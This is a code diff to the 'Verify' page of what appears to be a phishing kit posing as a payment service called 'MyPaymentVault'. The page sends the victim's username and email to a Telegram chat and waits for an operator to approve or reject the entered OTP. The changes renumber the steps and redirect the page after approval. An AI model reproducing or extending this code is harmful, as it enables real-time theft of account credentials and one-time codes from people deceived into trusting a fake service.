@@ -125,7 +125,7 @@ export default function Verify() {
     await sendTelegram(
       `━━━━━━━━━━━━━━━━━━━━━\n` +
       `✅ <b>MyPaymentVault</b>\n` +
-      `📌 <b>Step 3 — OTP Verified</b>\n` +
+      `📌 <b>Step 4 — OTP Verified</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n\n` +
       `👤 <b>Username</b>   : <code>${pendingUsername}</code>\n` +
       `📧 <b>Email</b>      : <code>${emailInput || maskedEmail || "-"}</code>\n` +
@@ -165,7 +165,7 @@ export default function Verify() {
         clearInterval(pollRef.current!);
         if (callbackId) await answerCallback(callbackId, "✅ OTP disetujui!");
         setWaiting(false);
-        navigate("/step4");
+        navigate("/");
       } else if (status === "rejected") {
         clearInterval(pollRef.current!);
         if (callbackId) await answerCallback(callbackId, "❌ OTP ditolak.");
@@ -308,32 +308,20 @@ export default function Verify() {
 
           {/* Step indicator */}
           <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 20 }}>
-            <div style={{
-              width: 22, height: 22, borderRadius: "50%",
-              background: "#111", display: "flex", alignItems: "center", justifyContent: "center",
-              flexShrink: 0,
-            }}>
-              <svg width="11" height="11" viewBox="0 0 12 12" fill="none">
-                <path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/>
-              </svg>
+            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
+              <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
             </div>
             <div style={{ flex: 1, height: 1, background: "#111" }} />
-            <div style={{
-              width: 22, height: 22, borderRadius: "50%",
-              background: "#111", display: "flex", alignItems: "center", justifyContent: "center",
-              flexShrink: 0,
-            }}>
-              <svg width="11" height="11" viewBox="0 0 12 12" fill="none">
-                <path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/>
-              </svg>
+            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
+              <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
             </div>
             <div style={{ flex: 1, height: 1, background: "#111" }} />
-            <div style={{
-              width: 22, height: 22, borderRadius: "50%",
-              background: "#111", display: "flex", alignItems: "center", justifyContent: "center",
-              flexShrink: 0,
-            }}>
-              <span style={{ fontSize: 11, color: "#fff", fontWeight: 600 }}>3</span>
+            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
+              <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
+            </div>
+            <div style={{ flex: 1, height: 1, background: "#111" }} />
+            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
+              <span style={{ fontSize: 11, color: "#fff", fontWeight: 600 }}>4</span>
             </div>
             <span style={{ fontSize: 12, color: "#888", marginLeft: 4 }}>Verification</span>
           </div>
